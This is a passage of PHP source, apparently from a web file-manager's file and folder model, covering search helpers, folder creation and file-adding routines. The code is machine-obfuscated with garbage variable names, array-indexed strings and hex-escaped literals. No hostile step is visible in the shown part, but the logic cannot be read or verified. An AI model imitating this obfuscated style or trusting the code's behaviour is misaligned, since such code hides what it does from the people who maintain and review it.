(!$–Äö[$Æóó—ÔœÔ‰ş»[1840]] || $ÁèİıÃ[$Æóó—ÔœÔ‰ş»[364]][$Æóó—ÔœÔ‰ş»[351]] > 1) { return; } if (!isset($âÆêŞÁÖ†®ß¼[$Æóó—ÔœÔ‰ş»[28]]) || !is_array($–Äö[$Æóó—ÔœÔ‰ş»[461]])) { return; } $âÆêŞÁÖ†®ß¼[$Æóó—ÔœÔ‰ş»[461]] = array($Æóó—ÔœÔ‰ş»[7], $–Äö[$Æóó—ÔœÔ‰ş»[461]]); unset($âÆêŞÁÖ†®ß¼[$Æóó—ÔœÔ‰ş»[28]]); unset($–Äö[$Æóó—ÔœÔ‰ş»[461]]); $²¡°æÂµê÷ = $this->field($ŞÄ´ÙêÑ°â±)->where($âÆêŞÁÖ†®ß¼)->limit($Æóó—ÔœÔ‰ş»[1998])->select(); if (!$²¡°æÂµê÷ || count($²¡°æÂµê÷) == 0) { return; } $ÁèİıÃ[$Æóó—ÔœÔ‰ş»[367]] = array_merge($²¡°æÂµê÷, $ÁèİıÃ[$Æóó—ÔœÔ‰ş»[367]]); $ÁèİıÃ[$Æóó—ÔœÔ‰ş»[364]][$Æóó—ÔœÔ‰ş»[365]] += count($²¡°æÂµê÷); } private function _listSearchTag(&$¾ĞØıª€¡ŠÓü, $†Ş½¼, $ãË³»¶) { $ï­¼€Ÿê =& $_SERVER[èÍ×öˆøÉ]; if (!$†Ş½¼[$ï­¼€Ÿê[1840]] || $¾ĞØıª€¡ŠÓü[$ï­¼€Ÿê[364]][$ï­¼€Ÿê[351]] > 1) { return; } $¥Â©ßÍêÄ = Model($ï­¼€Ÿê[1999])->listData(); $°ø‹Ø« = array(); $£úÌ£ÔÏ­éŞù = $†Ş½¼[$ï­¼€Ÿê[1840]]; foreach ($¥Â©ßÍêÄ as $›¨‹¥®§) { $¯Õ‘ü˜»– = $›¨‹¥®§[$ï­¼€Ÿê[28]]; $çÅ = str_replace($ï­¼€Ÿê[50], $ï­¼€Ÿê[33], Pinyin::get($¯Õ‘ü˜»–)); if (stripos($¯Õ‘ü˜»–, $£úÌ£ÔÏ­éŞù) !== !1 || stripos($çÅ, $£úÌ£ÔÏ­éŞù) !== !1) { $°ø‹Ø«[] = $›¨‹¥®§[$ï­¼€Ÿê[395]]; } } if (!$°ø‹Ø«) { return; } $Ø‡Ò” É•´’ = array($ï­¼€Ÿê[421] => array($ï­¼€Ÿê[7], $°ø‹Ø«), $ï­¼€Ÿê[1582] => USER_ID); $ô…ùŞ¸Ğ¿ = Model($ï­¼€Ÿê[422])->field($ï­¼€Ÿê[76])->where($Ø‡Ò” É•´’)->select(); $ô…ùŞ¸Ğ¿ = array_to_keyvalue($ô…ùŞ¸Ğ¿, $ï­¼€Ÿê[33], $ï­¼€Ÿê[76]); $§Èíîœó„ = array_unique($ô…ùŞ¸Ğ¿); $this->_listSearchMerge($¾ĞØıª€¡ŠÓü, $†Ş½¼, $ãË³»¶, $§Èíîœó„); } private function _listSearchDesc(&$±ÒëùëÓÛ»é, $¿«›ù‡‚÷¼, $÷Ë–ÃüüÈĞ–) { $ì­¬ =& $_SERVER[èÍ×öˆøÉ]; if (!$¿«›ù‡‚÷¼[$ì­¬[1840]] || $±ÒëùëÓÛ»é[$ì­¬[364]][$ì­¬[351]] > 1) { return; } $‰õØ¥›‰Ï = $this->listSearchChildren($¿«›ù‡‚÷¼[$ì­¬[492]]); $‰õØ¥›‰Ï = array_unique($‰õØ¥›‰Ï); if (!$‰õØ¥›‰Ï) { return; } $â­ËÈ = array($ì­¬[397] => array($ì­¬[7], $‰õØ¥›‰Ï), $ì­¬[93] => $ì­¬[445], $ì­¬[372] => array($ì­¬[381], $ì­¬[1842] . $¿«›ù‡‚÷¼[$ì­¬[1840]] . $ì­¬[1842])); $ù¾–»Š­ = Model($ì­¬[557])->field($ì­¬[397])->where($â­ËÈ)->select(); $ Ü = array_to_keyvalue($ù¾–»Š­, $ì­¬[33], $ì­¬[397]); $this->_listSearchMerge($±ÒëùëÓÛ»é, $¿«›ù‡‚÷¼, $÷Ë–ÃüüÈĞ–, $ Ü); } private function _listSearchGroupTag(&$Ò”ËÚÕ÷øˆ¢, $­Õ’‚Õ, $¬…ˆ¸Ôªˆµ¾) { $¬úÆ‚şø =& $_SERVER[èÍ×öˆøÉ]; if (!$­Õ’‚Õ[$¬úÆ‚şø[1840]] || $Ò”ËÚÕ÷øˆ¢[$¬úÆ‚şø[364]][$¬úÆ‚şø[351]] > 1 || !$­Õ’‚Õ[$¬úÆ‚şø[492]]) { return; } $Éºİö¤Î€ = $this->sourceInfo($­Õ’‚Õ[$¬úÆ‚şø[492]]); if (!$Éºİö¤Î€ || $Éºİö¤Î€[$¬úÆ‚şø[406]] != SourceModel::TYPE_GROUP) { return; } $Ç Ã = $Éºİö¤Î€[$¬úÆ‚şø[498]]; $¤€º = Model($¬úÆ‚şø[2000])->get($Ç Ã); $ç¡û = array(); $–Ö¥¸ = $­Õ’‚Õ[$¬úÆ‚şø[1840]]; foreach ($¤€º[$¬úÆ‚şø[367]] as $—ÖÜÂš–şçïà) { $ø©‹ÃÈ»õ‹ = $—ÖÜÂš–şçïà[$¬úÆ‚şø[28]]; $… ¶¨°Û = str_replace($¬úÆ‚şø[50], $¬úÆ‚şø[33], Pinyin::get($ø©‹ÃÈ»õ‹)); if (stripos($ø©‹ÃÈ»õ‹, $–Ö¥¸) !== !1 || stripos($… ¶¨°Û, $–Ö¥¸) !== !1) { $ç¡û[] = $—ÖÜÂš–şçïà[$¬úÆ‚şø[395]]; } } if (!$ç¡û) { return; } $ıÌ¬³±‚•Ó“ = array($¬úÆ‚şø[421] => array($¬úÆ‚şø[7], $ç¡û), $¬úÆ‚şø[1582] => 0, $¬úÆ‚şø[29] => $¬úÆ‚şø[1864] . $Ç Ã); $ÓşáÜÄ¥í¶¿ = Model($¬úÆ‚şø[422])->field($¬úÆ‚şø[76])->where($ıÌ¬³±‚•Ó“)->select(); $ÓşáÜÄ¥í¶¿ = array_to_keyvalue($ÓşáÜÄ¥í¶¿, $¬úÆ‚şø[33], $¬úÆ‚şø[76]); $™ÚéòÉ“ıß = array_unique($ÓşáÜÄ¥í¶¿); $this->_listSearchMerge($Ò”ËÚÕ÷øˆ¢, $­Õ’‚Õ, $¬…ˆ¸Ôªˆµ¾, $™ÚéòÉ“ıß); } private function _listSearchMerge(&$Ì”ÉÇÔĞ¦ß¢, $ò–àÉ¾Ü‹ı, $æË¤éÖÂ‹, $×„”) { $àÎÒ =& $_SERVER[èÍ×öˆøÉ]; if (!$×„”) { return; } $Ó¼•©– = array_to_keyvalue($Ì”ÉÇÔĞ¦ß¢[$àÎÒ[367]], $àÎÒ[33], $àÎÒ[397]); $Ì§û = array_diff($×„”, $Ó¼•©–); if (!$Ì§û) { return; } $éˆ¨¼ = array($àÎÒ[397] => array($àÎÒ[7], $Ì§û)); $Å«¸ê÷ = $this->field($æË¤éÖÂ‹)->where($éˆ¨¼)->select(); if (!$Å«¸ê÷) { return; } $¯¥Ë³Âà = array(); foreach ($Å«¸ê÷ as $ì‰Ï°’Ò£) { if ($this->_listSearchFilter($ì‰Ï°’Ò£, $ò–àÉ¾Ü‹ı)) { $¯¥Ë³Âà[] = $ì‰Ï°’Ò£; } } $Ì”ÉÇÔĞ¦ß¢[$àÎÒ[367]] = array_merge($¯¥Ë³Âà, $Ì”ÉÇÔĞ¦ß¢[$àÎÒ[367]]); $Ì”ÉÇÔĞ¦ß¢[$àÎÒ[364]][$àÎÒ[365]] += count($¯¥Ë³Âà); } private function _listSearchFilter($á€³·İ, $¸¡‰ñ¯³é´) { $ò“ÛÇ =& $_SERVER[èÍ×öˆøÉ]; $¼øš€ ÉÂÕ = $á€³·İ[$ò“ÛÇ[405]] == $ò“ÛÇ[87]; if (!strstr($á€³·İ[$ò“ÛÇ[515]], $ò“ÛÇ[47] . $¸¡‰ñ¯³é´[$ò“ÛÇ[492]] . $ò“ÛÇ[47])) { return !1; } if (isset($¸¡‰ñ¯³é´[$ò“ÛÇ[407]]) && $¸¡‰ñ¯³é´[$ò“ÛÇ[407]] != $ò“ÛÇ[1803]) { if ($¸¡‰ñ¯³é´[$ò“ÛÇ[407]] == $ò“ÛÇ[77] && !$¼øš€ ÉÂÕ) { return !1; } if ($¸¡‰ñ¯³é´[$ò“ÛÇ[407]] != $ò“ÛÇ[77] && $¼øš€ ÉÂÕ) { return !1; } if (!strstr($á€³·İ[$ò“ÛÇ[168]], $ò“ÛÇ[47] . $¸¡‰ñ¯³é´[$ò“ÛÇ[407]] . $ò“ÛÇ[47])) { return !1; } } if (isset($¸¡‰ñ¯³é´[$ò“ÛÇ[2001]]) && $¸¡‰ñ¯³é´[$ò“ÛÇ[2001]] < $á€³·İ[$ò“ÛÇ[78]]) { return !1; } if (isset($¸¡‰ñ¯³é´[$ò“ÛÇ[2002]]) && $¸¡‰ñ¯³é´[$ò“ÛÇ[2002]] > $á€³·İ[$ò“ÛÇ[78]]) { return !1; } if (isset($¸¡‰ñ¯³é´[$ò“ÛÇ[588]]) && $¸¡‰ñ¯³é´[$ò“ÛÇ[588]] != $á€³·İ[$ò“ÛÇ[448]]) { return !1; } return !0; } public function listSearchChildren($»²ÖÄ®ì, $°ğÊ = 5000) { $†»Ÿ =& $_SERVER[èÍ×öˆøÉ]; $‹´–¾Øû©à = array(); $•ñÍ˜‡š‚öü = $this->sourceInfo($»²ÖÄ®ì); $§†Ì = array($†»Ÿ[515] => array($†»Ÿ[381], $•ñÍ˜‡š‚öü[$†»Ÿ[515]] . $•ñÍ˜‡š‚öü[$†»Ÿ[397]] . $†»Ÿ[539])); $õ¬œä¿ = $this->field($†»Ÿ[397])->cache(null, 600)->where($§†Ì)->count(); if ($õ¬œä¿ > $°ğÊ) { return $this->_listSearchChildrenNear($»²ÖÄ®ì, $°ğÊ); } $‚ = $this->field($†»Ÿ[397])->where($§†Ì)->select(); $‹´–¾Øû©à = array_to_keyvalue($‚, $†»Ÿ[33], $†»Ÿ[397]); return $‹´–¾Øû©à; } private function _listSearchChildrenNear($¤¶‚…êøÅ›», $İ—Ú°»­³°«») { $—âÛˆÄîÃ =& $_SERVER[èÍ×öˆøÉ]; $ˆÇ†Œ¿ = array(); $äÎ¨¡ü = array($—âÛˆÄîÃ[492] => $¤¶‚…êøÅ›»); $ÔúÜóÄÛ„Ó = $this->field($—âÛˆÄîÃ[2003])->where($äÎ¨¡ü)->select(); $¬“ıÅªó­Á = array_to_keyvalue(array_filter_by_field($ÔúÜóÄÛ„Ó, $—âÛˆÄîÃ[405], $—âÛˆÄîÃ[87]), $—âÛˆÄîÃ[33], $—âÛˆÄîÃ[397]); $ˆÇ†Œ¿ = array_merge($ˆÇ†Œ¿, array_to_keyvalue($ÔúÜóÄÛ„Ó, $—âÛˆÄîÃ[33], $—âÛˆÄîÃ[397])); if (!$¬“ıÅªó­Á) { return $ˆÇ†Œ¿; } $äÎ¨¡ü = array($—âÛˆÄîÃ[492] => array($—âÛˆÄîÃ[7], $¬“ıÅªó­Á)); $ÔúÜóÄÛ„Ó = $this->field($—âÛˆÄîÃ[2003])->where($äÎ¨¡ü)->limit($İ—Ú°»­³°«»)->select(); $ˆÇ†Œ¿ = array_merge($ˆÇ†Œ¿, array_to_keyvalue($ÔúÜóÄÛ„Ó, $—âÛˆÄîÃ[33], $—âÛˆÄîÃ[397])); $ˆÇ†Œ¿ = array_slice($ˆÇ†Œ¿, 0, $İ—Ú°»­³°«»); return $ˆÇ†Œ¿; } private function _listSearchBindPinyin($ñÊê«§, &$ì§¾å±¡Ú, &$–âÕ­¥) { $ˆö°“˜Ìì =& $_SERVER[èÍ×öˆøÉ]; if (!isset($ñÊê«§[$ˆö°“˜Ìì[1840]]) || !$ñÊê«§[$ˆö°“˜Ìì[1840]]) { return; } if (!Input::check($ñÊê«§[$ˆö°“˜Ìì[1840]], $ˆö°“˜Ìì[316]) || strlen($ñÊê«§[$ˆö°“˜Ìì[1840]]) < 2) { return; } $äÓùÃ = "\x4c\x45\106\124\x20\112\117\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\163\157\165\162\143\145\137\x6d\145\x74\141\40\155\x65\x74\x61\x20\x6f\x6e\40\x73\x6f\165\x72\x63\145\56\163\x6f\165\x72\x63\145\x49\x44\x20\75\x20\155\x65\x74\141\x2e\163\157\x75\x72\143\145\x49\104"; $àòˆç”šÈ  = array(); $–âÕ­¥ = str_replace(array($ˆö°“˜Ìì[229], $ˆö°“˜Ìì[50], $ˆö°“˜Ìì[2004]), $ˆö°“˜Ìì[33], $–âÕ­¥); $–âÕ­¥ = $ˆö°“˜Ìì[430] . str_replace($ˆö°“˜Ìì[47], $ˆö°“˜Ìì[431], $–âÕ­¥); $ß‹÷ö‡ = $ì§¾å±¡Ú[$ˆö°“˜Ìì[28]]; unset($ì§¾å±¡Ú[$ˆö°“˜Ìì[28]]); foreach ($ì§¾å±¡Ú as $×¹í => $Æô) { $àòˆç”šÈ [$ˆö°“˜Ìì[430] . $×¹í] = $Æô; } foreach ($ß‹÷ö‡ as $â¼¿Æ¼Ö) { $àòˆç”šÈ [] = array($ˆö°“˜Ìì[435] => $â¼¿Æ¼Ö, $ˆö°“˜Ìì[997] => $ˆö°“˜Ìì[1844], array($ˆö°“˜Ìì[2005] => $â¼¿Æ¼Ö, $ˆö°“˜Ìì[2006] => array($ˆö°“˜Ìì[7], array($ˆö°“˜Ìì[458], $ˆö°“˜Ìì[457])))); } $this->join($äÓùÃ); $ì§¾å±¡Ú = $àòˆç”šÈ ; } private function _parseSearchWhere($™ˆ©›äâ³Â‹Ê) { $²È•ó‹İ»· =& $_SERVER[èÍ×öˆøÉ]; $«Ì = array(); if (isset($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[756]]) && $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[756]]) { $«Ì[$²È•ó‹İ»·[84]] = array($²È•ó‹İ»·[2007], $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[756]]); } if (isset($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[490]]) && $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[490]]) { $ßŠë = array($²È•ó‹İ»·[2008], $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[490]]); if ($«Ì[$²È•ó‹İ»·[84]]) { $«Ì[$²È•ó‹İ»·[84]] = array($«Ì[$²È•ó‹İ»·[84]], $ßŠë, $²È•ó‹İ»·[2009]); } else { $«Ì[$²È•ó‹İ»·[84]] = $ßŠë; } } if (isset($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[2001]]) && $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[2001]] > 0) { $«Ì[$²È•ó‹İ»·[78]] = array($²È•ó‹İ»·[2007], $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[2001]]); } if (isset($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[2002]]) && $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[2002]]) { $ßŠë = array($²È•ó‹İ»·[2008], $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[2002]]); if ($«Ì[$²È•ó‹İ»·[78]]) { $«Ì[$²È•ó‹İ»·[78]] = array($«Ì[$²È•ó‹İ»·[78]], $ßŠë, $²È•ó‹İ»·[2009]); } else { $«Ì[$²È•ó‹İ»·[78]] = $ßŠë; } } if (isset($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[588]]) && $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[588]]) { $«Ì[] = array($²È•ó‹İ»·[448] => $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[588]], $²È•ó‹İ»·[446] => $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[588]], $²È•ó‹İ»·[997] => $²È•ó‹İ»·[1844]); } if (isset($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[407]]) && $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[407]]) { $¯”ĞÅµğ“Šı = $™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[407]]; if ($¯”ĞÅµğ“Šı == $²È•ó‹İ»·[77]) { $«Ì[$²È•ó‹İ»·[405]] = 1; } else { if ($¯”ĞÅµğ“Šı == $²È•ó‹İ»·[2010]) { $«Ì[$²È•ó‹İ»·[405]] = 0; } else { if ($¯”ĞÅµğ“Šı) { $¯”ĞÅµğ“Šı = is_array($¯”ĞÅµğ“Šı) ? $¯”ĞÅµğ“Šı : explode($²È•ó‹İ»·[47], $¯”ĞÅµğ“Šı); $«Ì[$²È•ó‹İ»·[407]] = array($²È•ó‹İ»·[413], $¯”ĞÅµğ“Šı); $«Ì[$²È•ó‹İ»·[405]] = 0; } } } } $this->_parseSearchParent($™ˆ©›äâ³Â‹Ê, $«Ì); if (isset($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[1840]]) && trim($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[1840]])) { $ÑÃ­ªÅï… = trim($™ˆ©›äâ³Â‹Ê[$²È•ó‹İ»·[1840]]); $ÂÃº = explode($²È•ó‹İ»·[50], $ÑÃ­ªÅï…); if (strlen($ÑÃ­ªÅï…) > 2 && (substr($ÑÃ­ªÅï…, 0, 1) == $²È•ó‹İ»·[116] && substr($ÑÃ­ªÅï…, -1) == $²È•ó‹İ»·[116]) || substr($ÑÃ­ªÅï…, 0, 1) == $²È•ó‹İ»·[55] && substr($ÑÃ­ªÅï…, -1) == $²È•ó‹İ»·[55]) { $ÑÃ­ªÅï… = substr($ÑÃ­ªÅï…, 1, -1); $ÂÃº = array($ÑÃ­ªÅï…); } $«Ì[$²È•ó‹İ»·[28]] = array(array($²È•ó‹İ»·[538], $²È•ó‹İ»·[1842] . $ÑÃ­ªÅï… . $²È•ó‹İ»·[1842])); if (count($ÂÃº) > 1) { $«Ì[$²È•ó‹İ»·[28]] = array(); foreach ($ÂÃº as $®¸ôÊşú) { if (!trim($®¸ôÊşú)) { continue; } $«Ì[$²È•ó‹İ»·[28]][] = array($²È•ó‹İ»·[538], $²È•ó‹İ»·[1842] . trim($®¸ôÊşú) . $²È•ó‹İ»·[1842]); } } } return $«Ì; } private function _parseSearchParent($’Ôø±ÑÍ·, &$Û¦íñ) { $õ‘ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($’Ôø±ÑÍ·[$õ‘[492]]) || !$’Ôø±ÑÍ·[$õ‘[492]]) { return; } $ŸÔÄåâ = $this->pathInfo($’Ôø±ÑÍ·[$õ‘[492]]); $ÎŸğ = $ŸÔÄåâ[$õ‘[492]] . $õ‘[33] === $õ‘[191]; $»è‘¿¾­ = $ŸÔÄåâ[$õ‘[406]] == $õ‘[509]; $Û¦íñ[$õ‘[578]] = array($õ‘[538], $ŸÔÄåâ[$õ‘[515]] . $’Ôø±ÑÍ·[$õ‘[492]] . $õ‘[539]); $¼ôåâ­ = isset($’Ôø±ÑÍ·[$õ‘[1707]]) && in_array($õ‘[509], $’Ôø±ÑÍ·[$õ‘[1707]]); if (!$¼ôåâ­ || !$»è‘¿¾­ || !$ÎŸğ || !$ŸÔÄåâ[$õ‘[408]]) { return; } if (!AuthModel::authCheckRoot($ŸÔÄåâ[$õ‘[408]][$õ‘[409]])) { return; } $’çò = $ŸÔÄåâ[$õ‘[498]] . $õ‘[33]; if ($’çò == $õ‘[87]) { unset($Û¦íñ[$õ‘[578]]); $Û¦íñ[$õ‘[406]] = self::TYPE_GROUP; return; } $ÆÌ¦á ¤ = Model($õ‘[516])->groupChildrenAll($’çò); $°Å£ = count($ÆÌ¦á ¤); if ($°Å£ <= 1) { return; } $’æß¯ = array($õ‘[492] => 0, $õ‘[406] => self::TYPE_GROUP, $õ‘[498] => array($õ‘[7], $ÆÌ¦á ¤)); $„Ê— = $this->field($õ‘[2011])->where($’æß¯)->limit($°Å£)->select(); $Û¦íñ[$õ‘[578]] = array(); foreach ($„Ê— as $Áç²§ôÒ) { $Û¦íñ[$õ‘[578]][] = array($õ‘[538], $õ‘[525] . $Áç²§ôÒ[$õ‘[397]] . $õ‘[539]); } $Û¦íñ[$õ‘[578]][] = $õ‘[1844]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ĞóÃ½) { $½±Ç =& $_SERVER[èÍ×öˆøÉ]; $®ŞÜ¦çŞ„ = Model($½±Ç[507])->where(array($½±Ç[1573] => $ĞóÃ½))->find(); $ºöôî•Ñ’ÀÅŒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ĞóÃ½, $®ŞÜ¦çŞ„[$½±Ç[28]]); $this->userDesktopAdd($ºöôî•Ñ’ÀÅŒ); return $ºöôî•Ñ’ÀÅŒ; } public function userDesktopAdd($–¸›¤ï×¤) { $÷ÙĞ =& $_SERVER[èÍ×öˆøÉ]; $¶òÉõï = LNG($÷ÙĞ[2012]); $ê—ì»ñÍİÏÓ = $this->mkdir($–¸›¤ï×¤, $¶òÉõï); $this->metaSet($ê—ì»ñÍİÏÓ, $÷ÙĞ[2013], $÷ÙĞ[87]); $this->metaSet($–¸›¤ï×¤, $÷ÙĞ[2014], $ê—ì»ñÍİÏÓ); } public function groupRootAdd($€ğøÕîˆÛö‰Ã) { $ğç =& $_SERVER[èÍ×öˆøÉ]; $‡âŸÎÀµµé€ = Model($ğç[516])->where(array($ğç[1836] => $€ğøÕîˆÛö‰Ã))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $€ğøÕîˆÛö‰Ã, $‡âŸÎÀµµé€[$ğç[28]]); } public function systemRootPathAdd($Ç¹¹‚õõ) { if ($Ç¹¹‚õõ != $_SERVER[èÍ×öˆøÉ][531]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Ç¹¹‚õõ); } public function userRootRemove($Ì¸) { $÷È = $this->sourceRoot(SourceModel::TYPE_USER, $Ì¸); if (!$÷È) { return; } $this->remove($÷È, !1); } public function groupRootRemove($°Ì÷ÓåÖ) { $Ò»õ = $this->sourceRoot(SourceModel::TYPE_GROUP, $°Ì÷ÓåÖ); if (!$Ò»õ) { return; } $this->remove($Ò»õ, !1); } private function _mkdirRoot($£õû, $­–ß, $éÌ) { $Ê® =& $_SERVER[èÍ×öˆøÉ]; $ŸœàÅíã = array($Ê®[396] => 0, $Ê®[574] => $£õû, $Ê®[575] => $­–ß, $Ê®[571] => 1, $Ê®[576] => USER_ID, $Ê®[577] => USER_ID, $Ê®[572] => $Ê®[33], $Ê®[578] => $Ê®[525], $Ê®[424] => 0, $Ê®[573] => 0, $Ê®[462] => 0, $Ê®[579] => $Ê®[33]); if ($ïŞÍŸ = $this->where($ŸœàÅíã)->find()) { return $ïŞÍŸ[$Ê®[397]]; } $Ñ“…ñÒÏ = "\x4d\157\144\145\154\x53\157\x75\x72\143\145\x2e\155\x6b\144\151\162\x52\157\157\164\x2e{$£õû}\x2e{$­–ß}\x2e" . $éÌ; CacheLock::lock($Ñ“…ñÒÏ); $ŸœàÅíã[$Ê®[28]] = $éÌ; $¦ïÍú‰§ = $this->add($ŸœàÅíã); $‹Ô‡ = array($Ê®[580] => short_id($¦ïÍú‰§)); $this->where(array($Ê®[412] => $¦ïÍú‰§))->save($‹Ô‡); CacheLock::unlock($Ñ“…ñÒÏ); return $¦ïÍú‰§; } private function sourceRoot($ô», $¤‘ş—¢óµÁê, $ş„Çñˆş = false) { $Öêø¯— =& $_SERVER[èÍ×öˆøÉ]; $ı„½›ß·¢éè· = array($Öêø¯—[396] => 0, $Öêø¯—[574] => $ô», $Öêø¯—[575] => $¤‘ş—¢óµÁê); if ($Ïú°  = $this->where($ı„½›ß·¢éè·)->find()) { return $ş„Çñˆş ? $Ïú°  : $Ïú° [$Öêø¯—[397]]; } return !1; } public function sourceRootGroup($Î¥ù¶ÄĞË) { $ŸêŒ‰í =& $_SERVER[èÍ×öˆøÉ]; if (is_string($Î¥ù¶ÄĞË)) { $Î¥ù¶ÄĞË = array($Î¥ù¶ÄĞË); } $ŞìÆ = array($ŸêŒ‰í[396] => 0, $ŸêŒ‰í[575] => array($ŸêŒ‰í[7], $Î¥ù¶ÄĞË), $ŸêŒ‰í[574] => SourceModel::TYPE_GROUP); $this->selectPageReset(); $¦È×úö = $this->limit(count($Î¥ù¶ÄĞË))->listSource($ŞìÆ, 1000); $this->selectPageRestore(); return array_to_keyvalue($¦È×úö[$ŸêŒ‰í[75]], $ŸêŒ‰í[498]); } public function mkfile($¡ÛúâĞ©, $„…®Öó¡, $éíÁƒÒİÛ° = '', $€Ì•¡ = REPEAT_RENAME) { $Ó€ =& $_SERVER[èÍ×öˆøÉ]; $Ä”ØÈ¶ŠÎÑ = Model($Ó€[597])->addFileByContent($éíÁƒÒİÛ°, $„…®Öó¡); return $this->_createFileCall($¡ÛúâĞ©, $„…®Öó¡, $Ä”ØÈ¶ŠÎÑ, $€Ì•¡, $Ó€[1266]); } public function addFile($Ûá›•äó÷®¿, $”¯Œö, $óÓ¦¢ò¬š½, $ÚŒïÛ»„³ = false, $€£Šû€› = REPEAT_RENAME) { $ôœàŒ = Model($_SERVER[èÍ×öˆøÉ][597])->addFile($”¯Œö, $óÓ¦¢ò¬š½, $ÚŒïÛ»„³); return $this->_createFileCall($Ûá›•äó÷®¿, $óÓ¦¢ò¬š½, $ôœàŒ, $€£Šû€›); } public function addFileByFileID($’ƒß‚·“¤ß, $€–©, $ß¥óê, $¿‡Õí = REPEAT_RENAME) { $¸Ê½‹ =& $_SERVER[èÍ×öˆøÉ]; $İîÔÃÖ = Model($¸Ê½‹[597])->find($€–©); Model($¸Ê½‹[597])->linkAdd($€–©); return $this->_createFileCall($’ƒß‚·“¤ß, $ß¥óê, $İîÔÃÖ, $¿‡Õí); } public function addFileByRemote($Ñ£², $™¨„û, $ ƒ©ë£¿êÕ”, $ŠŒÀ = array(), $Š’‰ÑæÌ = REPEAT_RENAME) { $¨ì³Ò = Model($_SERVER[èÍ×öˆøÉ][597])->addFileByRemote($™¨„û, $ ƒ©ë£¿êÕ”, $ŠŒÀ); return $this->_createFileCall($Ñ£², $ ƒ©ë£¿êÕ”, $¨ì³Ò, $Š’‰ÑæÌ); } private function _createFileCall($ ¤¨ı²ÍÒõı, $ò²‰£, $öÃ, $Íî½ßª, $ï¯ÉıöœÎğ  = "\165\160\154\x6f\141\144") { $ñŞ¨“Ùø´Û =& $_SERVER[èÍ×öˆøÉ]; $µÜåµˆ¸ = !1; $this->setMasterDB(); $this->lockWriteStart($ ¤¨ı²ÍÒõı, $ò²‰£); $ï±îÑ = $this->fileNameExist($ ¤¨ı²ÍÒõı, $ò²‰£); $´Ì…ß¡ = $this->_createFile($ ¤¨ı²ÍÒõı, $ò²‰£, $öÃ, $Íî½ßª, $µÜåµˆ¸); if (!$µÜåµˆ¸) { Model($ñŞ¨“Ùø´Û[464])->remove($öÃ[$ñŞ¨“Ùø´Û[461]]); } if ($µÜåµˆ¸ && $´Ì…ß¡ && $´Ì…ß¡ != $ï±îÑ) { Model($ñŞ¨“Ùø´Û[1985])->eventCreate($´Ì…ß¡, $ï¯ÉıöœÎğ ); } $this->lockWriteEnd($ ¤¨ı²ÍÒõı, $ò²‰£); return $´Ì…ß¡; } public function mkdir($öéî‡°¹İ¬“å, $×²†Ú°ı, $›ŸÑåİ = REPEAT_SKIP) { $Ç™’ÖµåœÒ =& $_SERVER[èÍ×öˆøÉ]; $this->setMasterDB(); $ÜŞí¾—üì = $this->sourceInfo($öéî‡°¹İ¬“å); if (!$ÜŞí¾—üì) { return !1; } $this->lockWriteStart($öéî‡°¹İ¬“å, $×²†Ú°ı); if ($›ŸÑåİ !== !1) { $Ìã„¹º = $this->fileNameExist($öéî‡°¹İ¬“å, $×²†Ú°ı); if ($Ìã„¹º && $›ŸÑåİ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($öéî‡°¹İ¬“å, $×²†Ú°ı); return $Ìã„¹º; } $×²†Ú°ı = $this->fileNameAuto($öéî‡°¹İ¬“å, $×²†Ú°ı, $›ŸÑåİ); } $À¬ = array($Ç™’ÖµåœÒ[571] => 1, $Ç™’ÖµåœÒ[415] => $×²†Ú°ı, $Ç™’ÖµåœÒ[572] => $Ç™’ÖµåœÒ[33], $Ç™’ÖµåœÒ[462] => 0, $Ç™’ÖµåœÒ[573] => 0); $Çî½ = $this->_addSource($À¬, $ÜŞí¾—üì); Model($Ç™’ÖµåœÒ[1985])->eventCreate($Çî½, $Ç™’ÖµåœÒ[1267]); $this->lockWriteEnd($öéî‡°¹İ¬“å, $×²†Ú°ı); return $Çî½; } private function _createFile($ Â÷¸ äš¥ , $“çê¯, $ášóĞÈ¹¦Ö, $ÓËñ¾ÈìùË, &$¤äØ±) { $½©±ÔºÀ =& $_SERVER[èÍ×öˆøÉ]; $Ü£ = $this->sourceInfo($ Â÷¸ äš¥ ); if (!$ášóĞÈ¹¦Ö || !$Ü£) { return !1; } if ($ÓËñ¾ÈìùË !== !1) { $Úú¦€§ = $this->fileNameExist($ Â÷¸ äš¥ , $“çê¯); } $¤äØ± = !0; if ($ÓËñ¾ÈìùË && $Úú¦€§) { if ($ÓËñ¾ÈìùË == REPEAT_SKIP) { $¤äØ± = !1; return $Úú¦€§; } else { if ($ÓËñ¾ÈìùË == REPEAT_REPLACE) { $Öí– = $this->sourceInfo($Úú¦€§); $éûÍ” = $this->fileHistory($Öí–, $ášóĞÈ¹¦Ö[$½©±ÔºÀ[461]], $ášóĞÈ¹¦Ö[$½©±ÔºÀ[78]]); if (!$éûÍ”) { $¤äØ± = !1; } else { $this->folderSizeReset($ Â÷¸ äš¥ ); } return $Úú¦€§; } else { $“çê¯ = 